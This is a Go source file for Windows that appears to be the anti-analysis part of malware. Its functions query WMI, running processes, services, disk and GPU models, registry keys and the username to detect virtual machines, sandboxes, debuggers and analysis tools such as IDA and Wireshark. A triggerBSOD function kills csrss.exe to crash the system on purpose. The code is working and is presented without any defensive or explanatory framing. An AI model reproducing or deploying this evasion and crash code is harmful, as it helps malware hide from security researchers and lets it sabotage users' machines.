package main

import (
	"bytes"
	"os"
	"os/exec"
	"slices"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// checkGPU checks for the presence of virtual GPU drivers.
func checkGPU() bool {
	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		panic(err)
	}

	gpus := strings.Split(strings.TrimSpace(out.String()), "\n")
	for _, gpu := range gpus {
		gpu = strings.TrimSpace(strings.ToLower(gpu))
		// Checks for VirtualBox, VMware, QEMU, Parallels (macOS host) software GPU drivers
		if strings.Contains(gpu, "virtual") || strings.Contains(gpu, "vmware") || strings.Contains(gpu, "vbox") ||
			strings.Contains(gpu, "qemu") || strings.Contains(gpu, "virtio") || strings.Contains(gpu, "parallels") {
			return true
		}
	}
	return false
}

// checkManufacturer checks the system manufacturer for known virtual machine vendors, hypervisors, or cloud providers.
func checkManufacturer() bool {
	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		panic(err)
	}

	manufacturer := strings.TrimSpace(strings.ToLower(out.String()))
	// Checks for VMware, VirtualBox, QEMU, KVM, Microsoft Hyper-V, Xen
	if strings.Contains(manufacturer, "vmware") || strings.Contains(manufacturer, "virtualbox") ||
		strings.Contains(manufacturer, "qemu") || strings.Contains(manufacturer, "kvm") ||
		strings.Contains(manufacturer, "microsoft corporation") || strings.Contains(manufacturer, "xen") {
		return true
	}
	return false
}

// checkProcesses checks for the presence of common VM-related processes, debuggers, and analysis tools.
func checkProcesses() bool {
	cmd := exec.Command("powershell", "-Command", "Get-Process | Select-Object -ExpandProperty ProcessName")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		panic(err)
	}

	processes := strings.Split(strings.TrimSpace(out.String()), "\n")
	// List of common VM-related processes, debuggers, and analysis tools
	detected := []string{
		"vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "qemu-ga", "xenservice", "xenclient",
		"ollydbg", "ida", "ida64", "idag", "idag64", "idaw", "idaw64", "idaq", "idaq64", "scylla", "scylla_x64", "scylla_x86",
		"procexp", "procexp64", "processhacker", "processhacker.exe", "wireshark", "fiddler", "httpdebuggerui",
		"httpdebuggersvc", "qemu", "vmmouse", "vmusrvc", "vmsrvc",
	}
	for _, process := range processes {
		process = strings.TrimSpace(strings.ToLower(process))
		if slices.Contains(detected, process) {
			return true
		}
	}
	return false
}

// checkUsername checks for common usernames associated with virtual machines or testing environments.
func checkUsername() bool {
	username := strings.TrimSpace(strings.ToLower(os.Getenv("USERNAME")))
	suspiciousUsernames := []string{
		"admin", "administrator", "user", "test", "guest", "vmuser", "vboxuser", "qemuuser", "xenuser", "wdagutilityaccount",
	}
	return slices.Contains(suspiciousUsernames, username)
}

// checkServices checks for the presence of common VM-related Windows services.
func checkServices() bool {
	cmd := exec.Command("powershell", "-Command", "Get-Service | Select-Object -ExpandProperty Name")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		panic(err)
	}

	services := strings.Split(strings.TrimSpace(out.String()), "\n")
	// List of common VM-related services
	detected := []string{
		"vboxservice", "vmtools", "xenservice", "xenclient", "hyper-v", "vmms",
	}
	for _, service := range services {
		service = strings.TrimSpace(strings.ToLower(service))
		if slices.Contains(detected, service) {
			return true
		}
	}
	return false
}

// checkDiskModel checks the disk model for known virtual disk identifiers.
// For example, VMware often uses "VMware Virtual NVMe Disk" or similar.
func checkDiskModel() bool {
	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_DiskDrive | Select-Object -ExpandProperty Model")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		panic(err)
	}

	models := strings.Split(strings.TrimSpace(out.String()), "\n")
	for _, model := range models {
		model = strings.TrimSpace(strings.ToLower(model))
		if strings.Contains(model, "virtual") || strings.Contains(model, "vmware") || strings.Contains(model, "vbox") ||
			strings.Contains(model, "qemu") || strings.Contains(model, "virtio") || strings.Contains(model, "parallels") {
			return true
		}
	}
	return false
}

// checkRegeditKeys checks for the presence of registry keys associated with VM tools.
func checkRegeditKeys() bool {
	keys := [][]interface{}{
		{registry.CURRENT_USER, "SOFTWARE\\VMware, Inc.\\VMware Tools"},
		{registry.CURRENT_USER, "SOFTWARE\\Oracle\\VirtualBox Guest Additions"},
	}
	for _, k := range keys {
		key, path := k[0].(registry.Key), k[1].(string)
		k, err := registry.OpenKey(key, path, registry.READ)
		if err == nil {
			k.Close()
			return true
		}
	}
	return false
}

// isRunningInVM aggregates all checks to determine if the program is running in a virtualized environment.
// By "virtualized environment", I mean any virtual machine, sandbox, hypervisor, or cloud provider environment (e.g., AWS, Azure, GCP).
func isRunningInVM() bool {
	return checkManufacturer() || checkGPU() || checkProcesses() || checkUsername() || checkServices() ||
		checkDiskModel() || checkRegeditKeys()
}

func triggerBSOD() {
	err := exec.Command("taskkill", "/F", "/IM", "csrss.exe").Run()
	if err != nil {
		panic(err)
	}
}
